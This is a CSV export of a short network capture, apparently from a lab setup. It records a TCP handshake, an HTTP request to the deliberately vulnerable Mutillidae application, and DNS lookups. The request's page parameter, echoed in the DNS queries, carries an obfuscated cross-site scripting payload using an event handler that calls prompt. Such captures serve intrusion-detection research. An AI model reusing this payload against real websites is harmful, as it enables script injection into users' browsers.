"No.","Time","Source","Destination","Protocol","Length","Info","frame number","frame length","Frame Time","Frame Time (Epoch)","Frame Protocols","Ethernet Source","Ethernet Destination","Ethernet Type","IP Source","IP Destination","IP Length","IP TTL","IP Flags","IP Fragment Offset","IP Protocol","IP Version","IP DSCP Field","IP Checksum","TCP Source Port","TCP Destination Port","TCP Length","TCP Sequence Number","TCP Acknowledgment Number","TCP Flags","TCP SYN Flag","TCP ACK Flag","TCP FIN Flag","TCP RST Flag","TCP Window Size","TCP Checksum","TCP Stream","UDP Source Port","UDP Destination Port","UDP Length","UDP Checksum","ICMP Type","ICMP Checksum","HTTP Request Method","HTTP Request URI","HTTP Request Version","HTTP Full URI","HTTP Response Code","HTTP User-Agent","HTTP Content-Length","HTTP Content Type","HTTP Cookie","HTTP Host","HTTP Referer","HTTP Location","HTTP Authorization","HTTP Connection","DNS Query Name","DNS Query Type"
"213","13.567124790","192.168.1.108","192.168.1.104","TCP","74","44110  >  80 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=539925656 TSecr=0 WS=128","213","74","Jan 11, 2024 19:29:39.419177251 +03","1704990579.419177251","eth:ethertype:ip:tcp","08:00:27:37:96:63","08:00:27:5d:ef:d9","IPv4","192.168.1.108","192.168.1.104","60","64","0x40","0","TCP","4","0x00","0x6f72","44110","80","0","0","0","0x002","Set","Not set","Not set","Not set","64240","0x0610","16","","","","","","","","","","","","","","","","","","","","","",""
"214","13.568586488","192.168.1.104","192.168.1.108","TCP","74","80  >  44110 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=122079 TSecr=539925656 WS=64","214","74","Jan 11, 2024 19:29:39.420638949 +03","1704990579.420638949","eth:ethertype:ip:tcp","08:00:27:5d:ef:d9","08:00:27:37:96:63","IPv4","192.168.1.104","192.168.1.108","60","64","0x40","0","TCP","4","0x00","0xb697","80","44110","0","0","1","0x012","Set","Set","Not set","Not set","5792","0x98b4","16","","","","","","","","","","","","","","","","","","","","","",""
"215","13.568919855","192.168.1.108","192.168.1.104","TCP","66","44110  >  80 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=539925658 TSecr=122079","215","66","Jan 11, 2024 19:29:39.420972316 +03","1704990579.420972316","eth:ethertype:ip:tcp","08:00:27:37:96:63","08:00:27:5d:ef:d9","IPv4","192.168.1.108","192.168.1.104","52","64","0x40","0","TCP","4","0x00","0x6f79","44110","80","0","1","1","0x010","Not set","Set","Not set","Not set","64256","0xdc27","16","","","","","","","","","","","","","","","","","","","","","",""
"216","13.569226856","192.168.1.108","192.168.1.104","HTTP","543","GET /mutillidae/index.php?page=st4r7s%3CdeTaiLS%2509OnPOintErENtER%2509%3D%2509a%3Dprompt%2Ca%28%29%2F%2F3nd HTTP/1.1 ","216","543","Jan 11, 2024 19:29:39.421279317 +03","1704990579.421279317","eth:ethertype:ip:tcp:http","08:00:27:37:96:63","08:00:27:5d:ef:d9","IPv4","192.168.1.108","192.168.1.104","529","64","0x40","0","TCP","4","0x00","0x6d9b","44110","80","477","1","1","0x018","Not set","Set","Not set","Not set","64256","0x81d1","16","","","","","","","GET","/mutillidae/index.php?page=st4r7s%3CdeTaiLS%2509OnPOintErENtER%2509%3D%2509a%3Dprompt%2Ca%28%29%2F%2F3nd","HTTP/1.1","http://192.168.1.104/mutillidae/index.php?page=st4r7s%3CdeTaiLS%2509OnPOintErENtER%2509%3D%2509a%3Dprompt%2Ca%28%29%2F%2F3nd","","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991","","","","192.168.1.104","","","","close","",""
"217","13.570134395","192.168.1.104","192.168.1.108","TCP","66","80  >  44110 [ACK] Seq=1 Ack=478 Win=6912 Len=0 TSval=122080 TSecr=539925659","217","66","Jan 11, 2024 19:29:39.422186856 +03","1704990579.422186856","eth:ethertype:ip:tcp","08:00:27:5d:ef:d9","08:00:27:37:96:63","IPv4","192.168.1.104","192.168.1.108","52","64","0x40","0","TCP","4","0x00","0x0418","80","44110","0","1","478","0x010","Not set","Set","Not set","Not set","6912","0xdbd2","16","","","","","","","","","","","","","","","","","","","","","",""
"218","13.706500279","192.168.1.104","192.168.1.1","DNS","120","Standard query 0xe3ad AAAA st4r7s<deTaiLS%09OnPOintErENtER%09=%09a=prompt,a().local.lab","218","120","Jan 11, 2024 19:29:39.558552740 +03","1704990579.558552740","eth:ethertype:ip:udp:dns","08:00:27:5d:ef:d9","08:00:27:a6:7e:fb","IPv4","192.168.1.104","192.168.1.1","106","64","0x40","0","UDP","4","0x00","0xd9cc","","","","","","","","","","","","","","38505","53","86","0x6834","","","","","","","","","","","","","","","","","st4r7s<deTaiLS%09OnPOintErENtER%09=%09a=prompt,a().local.lab","AAAA (IPv6 Address)"
"219","13.706500790","192.168.1.1","192.168.1.104","DNS","195","Standard query response 0xe3ad No such name AAAA st4r7s<deTaiLS%09OnPOintErENtER%09=%09a=prompt,a().local.lab SOA a.root-servers.net","219","195","Jan 11, 2024 19:29:39.558553251 +03","1704990579.558553251","eth:ethertype:ip:udp:dns","08:00:27:a6:7e:fb","08:00:27:5d:ef:d9","IPv4","192.168.1.1","192.168.1.104","181","64","0x00","0","UDP","4","0x00","0xc7b2","","","","","","","","","","","","","","53","38505","161","0xa033","","","","","","","","","","","","","","","","","st4r7s<deTaiLS%09OnPOintErENtER%09=%09a=prompt,a().local.lab","AAAA (IPv6 Address)"
"220","13.706500829","192.168.1.104","192.168.1.1","DNS","120","Standard query 0xfa7f A st4r7s<deTaiLS%09OnPOintErENtER%09=%09a=prompt,a().local.lab","220","120","Jan 11, 2024 19:29:39.558553290 +03","1704990579.558553290","eth:ethertype:ip:udp:dns","08:00:27:5d:ef:d9","08:00:27:a6:7e:fb","IPv4","192.168.1.104","192.168.1.1","106","64","0x40","0","UDP","4","0x00","0xd9cb","","","","","","","","","","","","","","38269","53","86","0x5269","","","","","","","","","","","","","","","","","st4r7s<deTaiLS%09OnPOintErENtER%09=%09a=prompt,a().local.lab","A (Host Address)"
"221","13.706500869","192.168.1.1","192.168.1.104","DNS","195","Standard query response 0xfa7f No such name A st4r7s<deTaiLS%09OnPOintErENtER%09=%09a=prompt,a().local.lab SOA a.root-servers.net","221","195","Jan 11, 2024 19:29:39.558553330 +03","1704990579.558553330","eth:ethertype:ip:udp:dns","08:00:27:a6:7e:fb","08:00:27:5d:ef:d9","IPv4","192.168.1.1","192.168.1.104","181","64","0x00","0","UDP","4","0x00","0x6978","","","","","","","","","","","","","","53","38269","161","0x8a68","","","","","","","","","","","","","","","","","st4r7s<deTaiLS%09OnPOintErENtER%09=%09a=prompt,a().local.lab","A (Host Address)"
"222","13.709227688","192.168.1.104","192.168.1.108","TCP","4410","80  >  44110 [ACK] Seq=1 Ack=478 Win=6912 Len=4344 TSval=122115 TSecr=539925659 [TCP segment of a reassembled PDU]","222","4410","Jan 11, 2024 19:29:39.561280149 +03","1704990579.561280149","eth:ethertype:ip:tcp","08:00:27:5d:ef:d9","08:00:27:37:96:63","IPv4","192.168.1.104","192.168.1.108","4396","64","0x40","0","TCP","4","0x00","0xf31e","80","44110","4344","1","478","0x010","Not set","Set","Not set","Not set","6912","0x9543","16","","","","","","","","","","","","","","","","","","","","","",""
